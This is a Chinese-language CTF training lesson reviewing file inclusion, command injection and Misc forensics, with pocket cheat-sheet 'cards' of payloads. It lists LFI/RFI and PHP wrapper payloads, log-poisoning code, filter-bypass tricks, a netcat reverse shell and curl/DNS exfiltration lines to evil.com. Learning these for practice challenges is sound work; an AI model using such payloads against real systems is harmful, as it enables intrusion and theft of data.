# Day 30：第四周总复盘

> **学习目标**：系统回顾文件包含、命令执行、Misc入门的核心知识，制作便携式知识卡片，为下一周攻防世界实战做准备
> 
> **学习时长**：3-4小时
> 
> **难度等级**：⭐⭐⭐

---

## 📚 今日内容概览

1. 文件包含漏洞全面回顾
2. 命令执行漏洞全面回顾
3. Misc入门知识回顾
4. Payload便携卡片制作
5. 知识点串联练习
6. 错题复盘与巩固
7. 下周预习准备

---

## 一、文件包含漏洞全面回顾

### 1.1 文件包含漏洞是什么？

```
【通俗易懂的解释】

想象你有一个神奇的"传送门"：
  - 你告诉传送门一个地址，它就帮你把那个地方的东西搬过来
  - 正常情况下，你只能去允许的地方
  - 但如果传送门没有检查地址，你就可以去任何地方！

文件包含漏洞就是这样：
  - 网站有一个功能：include($_GET['file'])
  - 正常应该只包含网站内部的文件
  - 但如果没有限制，攻击者可以包含任何文件！

危害：
  - 读取敏感文件（/etc/passwd、配置文件）
  - 执行恶意代码（包含含有代码的文件）
  - 获取网站源码
  - 甚至远程包含恶意文件
```

### 1.2 文件包含的类型

```
【两种类型对比】

本地文件包含（LFI）：
  定义：只能包含服务器本地的文件
  
  示例：
    ?file=../../../etc/passwd
    ?file=/var/log/apache2/access.log
    ?file=php://filter/convert.base64-encode/resource=config.php
  
  危害：
    - 读取敏感文件
    - 读取源代码
    - 配合日志文件执行代码

远程文件包含（RFI）：
  定义：可以包含远程服务器上的文件
  
  示例：
    ?file=http://evil.com/shell.txt
    ?file=http://evil.com/shell.php
  
  危害：
    - 直接执行远程恶意代码
    - 危害比LFI更大
  
  注意：
    - 需要PHP配置 allow_url_include = On
    - 现在大多数服务器已关闭此功能
```

### 1.3 文件包含的常见场景

```
【CTF中常见的文件包含题目】

场景1：简单的LFI
  URL: http://ctf.com/index.php?file=about.php
  Payload: ?file=../../../etc/passwd
  目标：读取passwd文件获取flag

场景2：有后缀限制
  URL: http://ctf.com/index.php?file=about
  代码: include($_GET['file'] . ".php");
  Payload: ?file=../../../etc/passwd%00（空字节截断，PHP<5.3.4）
  或: ?file=php://filter/convert.base64-encode/resource=index

场景3：有路径限制
  URL: http://ctf.com/index.php?file=pages/about.php
  代码: include("pages/" . $_GET['file']);
  Payload: ?file=../../../../etc/passwd

场景4：过滤了关键字
  过滤: ../、etc、passwd
  绕过: ....//、..././、%2e%2e%2f

场景5：需要执行代码
  方法1: 包含日志文件（先注入代码到日志）
  方法2: 包含session文件
  方法3: 使用php伪协议
```

### 1.4 五大伪协议详解

```
【必须掌握的PHP伪协议】

1. php://filter —— 读取源代码
  用法：
    php://filter/convert.base64-encode/resource=index.php
  
  解释：
    - 把index.php的内容用Base64编码输出
    - 因为PHP文件直接包含会执行代码
    - 编码后可以看到源码
  
  示例：
    ?file=php://filter/convert.base64-encode/resource=config.php
    输出: PD9waHAgJGZsYWcgPSAi...
    解码后: <?php $flag = "flag{xxx}"; ?>

2. php://input —— 执行POST数据
  用法：
    ?file=php://input
    POST数据: <?php system('ls'); ?>
  
  解释：
    - 把POST的数据当作PHP代码执行
    - 需要allow_url_include = On
  
  示例：
    URL: ?file=php://input
    POST: <?php echo file_get_contents('/flag'); ?>

3. data:// —— 执行数据
  用法：
    data://text/plain,<?php system('ls');?>
    data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/Pg==
  
  解释：
    - 把数据当作文件内容
    - 可以直接执行代码
  
  示例：
    ?file=data://text/plain,<?php echo 'flag{test}'; ?>

4. file:// —— 读取本地文件
  用法：
    file:///etc/passwd
    file:///var/www/html/config.php
  
  解释：
    - 读取本地绝对路径文件
    - 不经过PHP处理
  
  示例：
    ?file=file:///flag

5. zip:// —— 读取压缩包内文件
  用法：
    zip://shell.zip%23shell.php
  
  解释：
    - %23是#的URL编码
    - 读取zip压缩包内的shell.php
  
  示例：
    先上传一个包含shell.php的zip文件
    然后 ?file=zip://upload/shell.zip%23shell.php
```

### 1.5 文件包含绕过技巧汇总

```
【遇到过滤怎么办？】

绕过技巧1：路径遍历
  基础: ../（上一级目录）
  进阶: ../../../../（多级）
  绕过过滤:
    ....//（双写绕过）
    ..././（中间加点）
    ..%2f（URL编码）
    ..%252f（双重编码）

绕过技巧2：空字节截断
  原理: %00让PHP认为字符串结束
  条件: PHP < 5.3.4
  示例: ?file=../../../etc/passwd%00.php

绕过技巧3：后缀绕过
  如果代码: include($file . ".php");
  方法1: 使用伪协议（不需要后缀）
  方法2: 空字节截断
  方法3: 超长文件名截断（PHP < 5.2.8）

绕过技巧4：关键字过滤绕过
  过滤etc: 使用/e%74c/（编码）
  过滤passwd: 使用/pa%73swd/
  过滤php: 使用/PhP/（大小写）

绕过技巧5：日志文件包含
  步骤:
    1. 找到日志文件位置
       /var/log/apache2/access.log
       /var/log/nginx/access.log
    2. 在User-Agent或URL中注入代码
       User-Agent: <?php system('cat /flag'); ?>
    3. 包含日志文件
       ?file=/var/log/apache2/access.log
```

### 1.6 文件包含Payload速查表

```
【便携卡片内容——文件包含】

基础Payload:
  ?file=../../../etc/passwd
  ?file=../../../../var/www/html/config.php
  ?file=/etc/passwd（绝对路径）

伪协议Payload:
  ?file=php://filter/convert.base64-encode/resource=index.php
  ?file=php://input（POST: <?php system('ls');?>）
  ?file=data://text/plain,<?php system('cat /flag');?>
  ?file=file:///flag

绕过Payload:
  ?file=....//....//....//etc/passwd
  ?file=..%2f..%2f..%2fetc/passwd
  ?file=/var/log/apache2/access.log（日志包含）

Windows路径:
  ?file=..\..\..\..\windows\system32\drivers\etc\hosts
  ?file=C:\windows\win.ini
```

---

## 二、命令执行漏洞全面回顾

### 2.1 命令执行漏洞是什么？

```
【通俗易懂的解释】

想象你在餐厅点菜：
  - 你告诉服务员："我要一份炒饭"
  - 服务员把你的话直接告诉厨师
  - 厨师就做炒饭

但如果服务员没有检查你的话：
  - 你说："我要一份炒饭，顺便把厨房烧了"
  - 厨师可能真的去烧厨房！

命令执行漏洞就是这样：
  - 网站接收用户输入，直接执行系统命令
  - 比如：system($_GET['cmd'])
  - 攻击者可以执行任意命令！

危害：
  - 读取任意文件
  - 写入恶意文件
  - 获取服务器权限
  - 反弹Shell
```

### 2.2 命令执行的常见场景

```
【CTF中常见的命令执行题目】

场景1：直接执行
  URL: http://ctf.com/exec.php?cmd=ls
  代码: system($_GET['cmd']);
  Payload: ?cmd=cat /flag

场景2：ping命令注入
  URL: http://ctf.com/ping.php?ip=127.0.0.1
  代码: system("ping -c 4 " . $_GET['ip']);
  Payload: ?ip=127.0.0.1;cat /flag
  Payload: ?ip=127.0.0.1|cat /flag

场景3：有过滤的命令执行
  过滤: cat、flag、空格
  绕过: ?cmd=ca''t /fl''ag
  绕过: ?cmd=ca\t%09/fl\ag
  绕过: ?cmd=$IFS$9cat$IFS$9/flag

场景4：无回显的命令执行
  方法1: 写入文件再读取
    ?cmd=cat /flag > /var/www/html/1.txt
    然后访问 /1.txt
  方法2: 使用curl外带
    ?cmd=curl http://evil.com/?data=$(cat /flag)
  方法3: 使用DNS外带
    ?cmd=nslookup $(cat /flag).evil.com

场景5：盲注命令执行
  方法: 时间盲注
    ?cmd=sleep 5（如果执行成功会延迟）
  判断: 根据响应时间判断命令是否执行
```

### 2.3 命令连接符详解

```
【必须掌握的命令连接符】

1. 分号 ; —— 顺序执行
  用法: command1;command2
  解释: 先执行command1，再执行command2
  示例: ping 127.0.0.1;cat /flag
  结果: ping执行完，然后cat /flag

2. 管道 | —— 传递输出
  用法: command1|command2
  解释: command1的输出作为command2的输入
  示例: ls|grep flag
  结果: ls的输出传给grep，筛选含flag的文件
  示例: cat /flag|base64
  结果: flag内容被base64编码

3. 或运算 || —— 失败才执行
  用法: command1||command2
  解释: command1失败才执行command2
  示例: cat /nofile||cat /flag
  结果: 第一个失败，执行第二个
  记忆口诀: "一个竖线只管传，两个竖线前面错才管"

4. 与运算 && —— 成功才执行
  用法: command1&&command2
  解释: command1成功才执行command2
  示例: ping 127.0.0.1&&cat /flag
  结果: ping成功才执行cat

5. 反引号 ` —— 命令替换
  用法: `command`
  解释: 执行command，结果替换当前位置
  示例: echo `cat /flag`
  结果: 输出flag内容

6. $() —— 命令替换
  用法: $(command)
  解释: 同反引号，执行command并替换
  示例: echo $(cat /flag)
  结果: 输出flag内容
```

### 2.4 命令执行绕过技巧汇总

```
【遇到过滤怎么办？】

绕过技巧1：空格绕过
  过滤了空格怎么办？
  
  方法:
    $IFS —— 内部字段分隔符
    $IFS$9 —— 加数字避免变量解析问题
    ${IFS} —— 用花括号包裹
    %09 —— Tab的URL编码
    %20 —— 空格的URL编码
    {cat,/flag} —— 使用花括号
  
  示例:
    cat$IFS$9/flag
    cat${IFS}/flag
    cat%09/flag
    {cat,/flag}

绕过技巧2：关键字绕过
  过滤了cat怎么办？
  
  方法:
    '' —— 用空字符串分割
    \ —— 用反斜杠转义
    $@ —— 用特殊变量分割
    变量拼接 —— a=cat;b=/flag;$a $b
    使用替代命令 —— more、less、head、tail
  
  示例:
    ca''t /flag
    ca\t /flag
    ca$@t /flag
    a=cat;b=/flag;$a $b
    head /flag

绕过技巧3：通配符绕过
  过滤了flag怎么办？
  
  方法:
    * —— 匹配任意字符
    ? —— 匹配单个字符
    [] —— 匹配指定字符
  
  示例:
    cat /fl*
    cat /fl?g
    cat /f[a-z]ag
    cat /????

绕过技巧4：编码绕过
  方法:
    Base64编码
    Hex编码
    URL编码
  
  示例:
    echo "Y2F0IC9mbGFn"|base64 -d|bash
    # Y2F0IC9mbGFn = cat /flag

绕过技巧5：长度限制绕过
  如果命令长度被限制（如限制7字符）
  
  方法:
    写入文件，逐步构造命令
    echo "cat /flag" > a
    sh a
```

### 2.5 常用命令速查表

```
【便携卡片内容——命令执行】

文件操作:
  cat /flag —— 读取flag
  head /flag —— 读取前几行
  tail /flag —— 读取后几行
  more /flag —— 分页读取
  less /flag —— 分页读取
  ls / —— 列出根目录
  ls -la —— 详细列出文件
  find / -name flag —— 查找flag文件

目录操作:
  pwd —— 显示当前目录
  cd /tmp —— 切换目录

写入操作:
  echo "content" > file —— 写入文件
  echo "content" >> file ——追加写入

网络操作:
  curl http://url —— HTTP请求
  wget http://url —— 下载文件
  nc -e /bin/bash ip port —— 反弹shell

系统信息:
  id —— 显示用户信息
  whoami —— 显示当前用户
  uname -a —— 系统信息

编码解码:
  base64 file —— Base64编码
  base64 -d —— Base64解码
  xxd —— Hex编码
  xxd -r —— Hex解码
```

---

## 三、Misc入门知识回顾

### 3.1 Misc是什么？

```
【通俗易懂的解释】

Misc = Miscellaneous = 杂项

为什么叫杂项？
  - 因为它包含各种"非标准"的题目
  - 不属于Web、Pwn、Crypto、Reverse任何一个
  - 但又可能涉及所有方向

常见Misc题目类型：
  - 隐写术（图片、音频、视频中隐藏信息）
  - 流量分析（分析网络流量包）
  - 文件分析（分析文件格式、修复文件）
  - 取证分析（内存取证、磁盘取证）
  - 编码解码（各种编码转换）
  - 信息搜集（OSINT）
  - 编程题（写脚本解决问题）

为什么Misc适合入门？
  - 不需要深厚的编程基础
  - 更多依赖工具使用和观察力
  - 题目直观，容易理解
  - 可以快速获得成就感
```

### 3.2 文件头与文件格式

```
【必须掌握的文件头知识】

什么是文件头？
  - 文件开头的一段特殊字节
  - 用于标识文件类型
  - 也叫"魔数"（Magic Number）

为什么重要？
  - 文件头损坏 → 文件无法打开
  - 文件头错误 → 程序识别错误
  - CTF中常考：修复文件头、识别文件类型

常见文件头（必须背下来）：

图片文件:
  PNG: 89 50 4E 47 0D 0A 1A 0A
       对应ASCII: ‰PNG....
  
  JPEG/JPG: FF D8 FF
            开头三个字节
  
  GIF: 47 49 46 38
       对应ASCII: GIF8
  
  BMP: 42 4D
       对应ASCII: BM

压缩文件:
  ZIP: 50 4B 03 04
       对应ASCII: PK..
  
  RAR: 52 61 72 21
       对应ASCII: Rar!
  
  7Z: 37 7A BC AF 27 1C

文档文件:
  PDF: 25 50 44 46
       对应ASCII: %PDF
  
  DOC/XLS/PPT (旧版): D0 CF 11 E0
  
  DOCX/XLSX/PPTX (新版): 50 4B 03 04（实际是ZIP）

可执行文件:
  EXE (Windows): 4D 5A
                 对应ASCII: MZ
  
  ELF (Linux): 7F 45 4C 46
               对应ASCII: .ELF

音频文件:
  WAV: 52 49 46 46
       对应ASCII: RIFF
  
  MP3: FF FB 或 FF FA

视频文件:
  AVI: 52 49 46 46
       对应ASCII: RIFF
  
  MP4: 00 00 00 18 66 74 79 70
       对应ASCII: ....ftyp
```

### 3.3 文件头修复实战

```
【CTF常见题型：文件头修复】

题目类型1：文件头被删除
  现象: 文件无法打开
  解决: 用010 Editor添加正确的文件头
  
  步骤:
    1. 用010 Editor打开损坏文件
    2. 查看文件开头（可能全是00或乱码）
    3. 根据题目提示或文件扩展名判断类型
    4. 在开头插入正确的文件头字节
    5. 保存文件，用对应程序打开

题目类型2：文件头被修改
  现象: 文件被识别为错误类型
  解决: 恢复正确的文件头
  
  步骤:
    1. 用010 Editor打开文件
    2. 对比正确的文件头
    3. 修改错误的字节
    4. 保存并打开

题目类型3：文件类型伪装
  现象: 扩展名是jpg，但实际是png
  解决: 识别真实类型
  
  步骤:
    1. 用010 Editor查看文件头
    2. 根据文件头判断真实类型
    3. 修改扩展名或用对应程序打开

实战示例:
  题目: 一个无法打开的图片文件
  
  分析:
    1. 010 Editor打开，开头是 00 00 00 00
    2. 题目提示是PNG图片
    3. PNG文件头: 89 50 4E 47 0D 0A 1A 0A
  
  操作:
    1. 在010 Editor中选中前8字节
    2. 输入: 89 50 4E 47 0D 0A 1A 0A
    3. 保存为.png
    4. 用图片查看器打开，看到flag
```

### 3.4 流量分析基础

```
【Wireshark使用入门】

什么是流量分析？
  - 分析网络通信的数据包
  - 查看传输的内容
  - 发现隐藏的信息

Wireshark基础操作:
  1. 打开pcap文件
  2. 查看协议统计: Statistics → Protocol Hierarchy
  3. 过滤显示: 输入过滤条件
     - tcp —— 只显示TCP包
     - http —— 只显示HTTP包
     - dns —— 只显示DNS包
  4. 追踪流: 右键 → Follow → TCP Stream
  5. 搜索内容: Edit → Find Packet

常见CTF流量分析题目:

题目类型1：HTTP流量分析
  目标: 找到HTTP请求/响应中的flag
  
  方法:
    1. 过滤http
    2. 查看请求内容
    3. 查看响应内容
    4. 搜索flag关键字

题目类型2：TCP流分析
  目标: 找到TCP传输的数据
  
  方法:
    1. Follow TCP Stream
    2. 查看完整对话内容
    3. 可能需要解码（Base64等）

题目类型3：DNS流量分析
  目标: DNS请求中隐藏的信息
  
  方法:
    1. 过滤dns
    2. 查看DNS查询域名
    3. 域名可能包含flag或编码后的flag

题目类型4：文件提取
  目标: 从流量中提取传输的文件
  
  方法:
    1. File → Export Objects → HTTP
    2. 选择传输的文件
    3. 保存并分析
```

### 3.5 隐写术入门

```
【图片隐写术基础】

什么是隐写术？
  - 把信息隐藏在图片、音频、视频中
  - 外观看起来是正常的图片
  - 但里面隐藏着秘密信息

常见图片隐写方法:

方法1：LSB隐写
  原理:
    - 图片每个像素有RGB三个颜色值
    - 每个值8位（0-255）
    - 最低位（LSB）改变对视觉影响很小
    - 把信息藏在最低位
  
  检测工具:
    - StegSolve（Java工具）
    - zsteg（命令行工具）
  
  操作步骤:
    1. 用StegSolve打开图片
    2. 选择 Data Extract
    3. 选择 LSB 和颜色通道
    4. 查看提取的数据

方法2：文件尾部追加
  原理:
    - 图片文件有结束标记
    - 在结束标记后追加数据不影响显示
    - 用010 Editor查看文件尾部
  
  检测方法:
    1. 010 Editor打开图片
    2. 查看文件尾部
    3. 搜索flag或异常数据

方法3：图片拼接
  原理:
    - 两张图片拼在一起
    - 上层图片有透明区域
    - 下层图片隐藏信息
  
  检测方法:
    1. 用StegSolve打开
    2. 切换通道查看
    3. 或用Image Combiner功能

方法4：EXIF信息
  原理:
    - 图片的元数据（拍摄信息）
    - 可以在注释字段写入信息
  
  检测方法:
    1. 右键图片 → 属性 → 详细信息
    2. 或用exiftool查看
       exiftool image.jpg
```

---

## 四、Payload便携卡片制作

### 4.1 为什么制作知识卡片？

```
【卡片的作用】

为什么需要卡片？
  - CTF比赛时间有限
  - 不可能记住所有Payload
  - 快速查阅提高效率
  - 随时复习巩固记忆

卡片制作原则:
  1. 简洁明了 —— 一眼看懂
  2. 分类清晰 —— 快速定位
  3. 常用优先 —— 先记高频Payload
  4. 便于携带 —— 手机拍照或打印

建议卡片数量:
  - 文件包含：1张
  - 命令执行：1张
  - SQL注入：1张
  - Misc工具：1张
  - Burp操作：1张
  共5张核心卡片
```

### 4.2 文件包含卡片内容

```
【卡片模板——文件包含】

┌─────────────────────────────────────┐
│        文件包含漏洞速查卡            │
├─────────────────────────────────────┤
│ 基础Payload:                         │
│   ?file=../../../etc/passwd          │
│   ?file=/var/www/html/config.php     │
├─────────────────────────────────────┤
│ 伪协议:                              │
│   php://filter/convert.base64-       │
│     encode/resource=index.php        │
│   php://input + POST:<?php code?>    │
│   data://text/plain,<?php code?>     │
│   file:///flag                       │
├─────────────────────────────────────┤
│ 绕过技巧:                            │
│   ../过滤 → ....// 或 ..%2f          │
│   后缀限制 → 伪协议或%00截断         │
│   关键字过滤 → 编码或大小写          │
│   日志包含 → /var/log/apache2/...    │
├─────────────────────────────────────┤
│ 常见文件路径:                        │
│   /etc/passwd                        │
│   /var/www/html/index.php            │
│   /proc/self/environ                 │
│   C:\windows\win.ini (Windows)       │
└─────────────────────────────────────┘
```

### 4.3 命令执行卡片内容

```
【卡片模板——命令执行】

┌─────────────────────────────────────┐
│        命令执行漏洞速查卡            │
├─────────────────────────────────────┤
│ 连接符:                              │
│   ;  → 顺序执行(cmd1;cmd2)           │
│   |  → 管道传递(cmd1|cmd2)           │
│   || → 失败才执行(cmd1||cmd2)        │
│   && → 成功才执行(cmd1&&cmd2)        │
├─────────────────────────────────────┤
│ 空格绕过:                            │
│   $IFS、$IFS$9、${IFS}、%09          │
│   示例: cat$IFS$9/flag               │
├─────────────────────────────────────┤
│ 关键字绕过:                          │
│   cat → ca''t、ca\t、head、more      │
│   flag → fl*、fl?g、f[a-z]ag         │
│   示例: ca''t /fl''ag                │
├─────────────────────────────────────┤
│ 常用命令:                            │
│   cat /flag → 读flag                 │
│   ls / → 列目录                      │
│   find / -name flag → 查找           │
│   echo "xx" > file → 写文件          │
│   curl http://url → 外带数据         │
├─────────────────────────────────────┤
│ 无回显:                              │
│   写文件: cat /flag > 1.txt          │
│   外带: curl http://evil/?d=$(cat...)│
└─────────────────────────────────────┘
```

### 4.4 SQL注入卡片内容

```
【卡片模板——SQL注入】

┌─────────────────────────────────────┐
│        SQL注入速查卡                 │
├─────────────────────────────────────┤
│ 判断注入:                            │
│   ?id=1' → 报错                      │
│   ?id=1 and 1=1 → 正常              │
│   ?id=1 and 1=2 → 异常              │
├─────────────────────────────────────┤
│ 判断列数:                            │
│   ?id=1 order by 1                  │
│   ?id=1 order by 2                  │
│   ...直到报错                        │
├─────────────────────────────────────┤
│ 联合查询:                            │
│   ?id=-1 union select 1,2,3         │
│   看回显位置                         │
├─────────────────────────────────────┤
│ 查库:                                │
│   SELECT schema_name FROM           │
│     information_schema.schemata     │
├─────────────────────────────────────┤
│ 查表:                                │
│   SELECT table_name FROM            │
│     information_schema.tables       │
│     WHERE table_schema='库名'       │
├─────────────────────────────────────┤
│ 查字段:                              │
│   SELECT column_name FROM           │
│     information_schema.columns      │
│     WHERE table_name='表名'         │
├─────────────────────────────────────┤
│ 报错注入:                            │
│   updatexml(1,concat(0x7e,          │
│     (SELECT...),0x7e),1)            │
├─────────────────────────────────────┤
│ 盲注:                                │
│   length()、substr()、ascii()       │
│   sleep()、if()                     │
└─────────────────────────────────────┘
```

### 4.5 Misc工具卡片内容

```
【卡片模板——Misc工具】

┌─────────────────────────────────────┐
│        Misc工具速查卡                │
├─────────────────────────────────────┤
│ 文件头:                              │
│   PNG: 89 50 4E 47                  │
│   JPG: FF D8 FF                     │
│   ZIP: 50 4B 03 04                  │
│   PDF: 25 50 44 46                  │
│   EXE: 4D 5A                        │
├─────────────────────────────────────┤
│ 工具用途:                            │
│   010 Editor → 编辑文件头           │
│   Wireshark → 分析流量              │
│   StegSolve → LSB隐写               │
│   binwalk → 分离隐藏文件            │
│   exiftool → 查看EXIF               │
│   Audacity → 音频频谱               │
├─────────────────────────────────────┤
│ Wireshark操作:                       │
│   过滤: http、tcp、dns               │
│   追踪流: Follow TCP Stream          │
│   搜索: Edit → Find Packet           │
│   提取文件: File → Export Objects    │
├─────────────────────────────────────┤
│ binwalk命令:                         │
│   binwalk file → 分析               │
│   binwalk -e file → 提取            │
├─────────────────────────────────────┤
│ 编码识别:                            │
│   Base64: 结尾有=                    │
│   URL: 有%XX                        │
│   Hex: 全是0-9A-F                   │
│   Morse: .和-组成                   │
└─────────────────────────────────────┘
```

---

## 五、知识点串联练习

### 5.1 综合练习题

```
【综合练习：串联所有知识点】

题目1：文件包含 + 命令执行
  场景:
    网站有文件包含漏洞
    但无法直接读取flag（权限限制）
    需要先包含日志文件执行命令
  
  解题步骤:
    1. 在User-Agent注入: <?php system('cat /flag');?>
    2. 访问题目，让日志记录恶意代码
    3. 包含日志文件: ?file=/var/log/apache2/access.log
    4. 获取flag

题目2：命令执行 + 文件写入
  场景:
    命令执行无回显
    需要先写入文件再读取
  
  解题步骤:
    1. ?cmd=cat /flag > /var/www/html/output.txt
    2. 访问 /output.txt
    3. 获取flag

题目3：Misc + 编码
  场景:
    图片文件头损坏
    修复后发现里面有Base64编码的flag
  
  解题步骤:
    1. 010 Editor修复PNG文件头
    2. 打开图片，看到Base64字符串
    3. 解码获取flag
```

### 5.2 错题复盘方法

```
【如何有效复盘错题】

复盘步骤:
  1. 记录题目信息
     - 题目名称、来源
     - 自己的解题思路
     - 卡在哪里
  
  2. 分析错误原因
     - 知识盲区？
     - Payload记不住？
     - 工具不会用？
     - 思路错误？
  
  3. 学习正确解法
     - 看WriteUp
     - 理解解题思路
     - 记录关键Payload
  
  4. 重新解题
     - 不看WriteUp重新做
     - 验证是否真正掌握
  
  5. 总结归纳
     - 这类题的共同特点
     - 通用的解题方法
     - 需要记住的知识点

错题本格式:
  ┌─────────────────────────────────┐
  │ 题目: XXX                        │
  │ 来源: CTFHub                     │
  │ 错误原因: 不知道空格可以用$IFS绕过│
  │ 正确Payload: cat$IFS$9/flag      │
  │ 复盘时间: 2024-XX-XX             │
  │ 是否重做: ✓                      │
  └─────────────────────────────────┘
```

---

## 六、下周预习准备

### 6.1 攻防世界平台介绍

```
【攻防世界是什么？】

攻防世界:
  - 国内知名CTF练习平台
  - 题目质量较高
  - 分类清晰（Web、Pwn、Crypto、Reverse、Misc）
  - 有新手区和进阶区

新手区特点:
  - 题目难度适中
  - 有提示和WriteUp
  - 适合入门练习
  - 每个方向约20-30题

访问地址:
  https://adworld.xctf.org.cn

注册账号:
  1. 访问攻防世界官网
  2. 注册账号
  3. 进入新手练习区
  4. 选择Web或Misc方向开始

下周目标:
  - Web新手区：完成至少10题
  - Misc新手区：完成至少10题
  - 每题限时20分钟
  - 超时看WriteUp学习
```

### 6.2 dirsearch工具预习

```
【下周重点工具：dirsearch】

什么是dirsearch？
  - 目录扫描工具
  - 扫描网站的隐藏目录和文件
  - Python编写，命令行使用

为什么重要？
  - 很多CTF题目有隐藏目录
  - 如 /flag、/backup、/admin
  - 扫到隐藏目录是解题关键

安装方法:
  git clone https://github.com/maurosoria/dirsearch
  cd dirsearch
  pip3 install -r requirements.txt

基本用法:
  python3 dirsearch.py -u http://target.com -e php
  
  参数解释:
    -u: 目标URL
    -e: 扫描的文件扩展名

常用参数:
  -u URL —— 目标地址
  -e ext —— 扩展名（php,html,txt）
  -w wordlist —— 自定义字典
  -t threads —— 线程数
  -x status —— 排除状态码

下周练习:
  - 用dirsearch扫描攻防世界题目
  - 找隐藏目录如 /flag、/backup
  - 记录扫描结果
```

---

## 七、今日总结

### 7.1 知识点回顾

```
【第四周核心知识点】

✅ 文件包含漏洞
  - LFI和RFI的区别
  - 五大伪协议的使用
  - 各种绕过技巧

✅ 命令执行漏洞
  - 命令连接符（;、|、||、&&）
  - 空格绕过方法
  - 关键字绕过方法
  - 无回显处理方法

✅ Misc入门
  - 文件头识别和修复
  - Wireshark流量分析
  - 图片隐写术基础

✅ 知识卡片制作
  - 文件包含卡片
  - 命令执行卡片
  - SQL注入卡片
  - Misc工具卡片
```

### 7.2 今日作业

```
【必做作业】

1. 制作5张知识卡片
   - 文件包含、命令执行、SQL注入、Misc工具、Burp操作
   - 可以手写或打印
   - 随身携带复习

2. 复盘第四周错题
   - 选出3-5道卡住的题
   - 分析错误原因
   - 学习正确解法
   - 重新解题验证

3. 注册攻防世界账号
   - 完成注册
   - 浏览新手区题目
   - 了解题目分类

【选做作业】

1. 安装dirsearch工具
   - 测试基本用法
   - 扫描一个测试网站

2. 整理第四周笔记
   - 按知识点分类
   - 补充遗漏内容
```

### 7.3 明日预告

```
【Day 31：攻防世界Web新手区（上）】

学习内容:
  - 攻防世界平台使用
  - Web新手区题目实战
  - dirsearch目录扫描
  - 隐藏目录发现技巧

准备工作:
  - 注册攻防世界账号
  - 安装dirsearch工具
  - 准备好知识卡片
  - 复习Web漏洞知识
```

---

## 八、常见问题FAQ

### Q1: 知识卡片怎么用最有效？

```
回答:
  知识卡片是快速查阅工具，不是学习材料。

使用方法:
  1. 解题时快速查阅
     - 遇到过滤，查绕过技巧
     - 忘记Payload，查速查表
  
  2. 空闲时复习记忆
     - 等车、排队时拿出来看
     - 每天至少看一遍
  
  3. 比赛时快速参考
     - CTF比赛时间有限
     - 卡片提高效率

记忆技巧:
  - 不要死记硬背
  - 理解Payload原理
  - 多用几次自然记住
```

### Q2: Misc方向需要什么基础？

```
回答:
  Misc是最适合入门的方向，基础要求低。

需要的基础:
  1. 工具使用能力
     - 010 Editor、Wireshark
     - StegSolve、binwalk
  
  2. 观察力和细心
     - 发现文件异常
     - 注意细节
  
  3. 编码知识
     - Base64、Hex、URL编码
     - 能识别编码类型
  
  4. 基本编程能力
     - Python脚本编写
     - 处理数据转换

不需要的基础:
  - 不需要深厚的数学
  - 不需要汇编语言
  - 不需要网络协议深度知识
```

### Q3: 第四周学完能达到什么水平？

```
回答:
  第四周学完后，你应该具备入门级CTF能力。

能力评估:
  ✅ 能识别和利用文件包含漏洞
  ✅ 能识别和利用命令执行漏洞
  ✅ 能处理Misc入门题目
  ✅ 能使用常用工具
  ✅ 能独立完成简单CTF题目

下一步目标:
  - 攻防世界新手区通关
  - 参加线上周赛
  - 学习进阶漏洞类型

时间估计:
  - 入门阶段：1-2个月（已完成）
  - 进阶阶段：3-6个月（下周开始）
  - 精通阶段：6-12个月
```

---

## 九、笔记模板

```
Day 30 学习笔记
====================

日期：____年__月__日
学习时长：___小时

一、文件包含漏洞总结
--------------------
1. LFI和RFI的区别：
   
2. 五大伪协议：
   
3. 绕过技巧：
   

二、命令执行漏洞总结
--------------------
1. 命令连接符：
   
2. 空格绕过：
   
3. 关键字绕过：
   

三、Misc入门总结
----------------
1. 文件头：
   
2. Wireshark操作：
   
3. 隐写术：
   

四、知识卡片制作
----------------
卡片1内容：
   
卡片2内容：
   

五、错题复盘
------------
题目1：
  错误原因：
  正确解法：
  
题目2：
  错误原因：
  正确解法：


六、下周准备
------------
1. 攻防世界账号：
   
2. dirsearch安装：
   

七、自我评价
------------
理解程度：⭐⭐⭐⭐⭐
动手能力：⭐⭐⭐⭐⭐
完成情况：⭐⭐⭐⭐⭐
```

---

**恭喜你完成第四周的学习！下周进入攻防世界实战阶段！** 🎉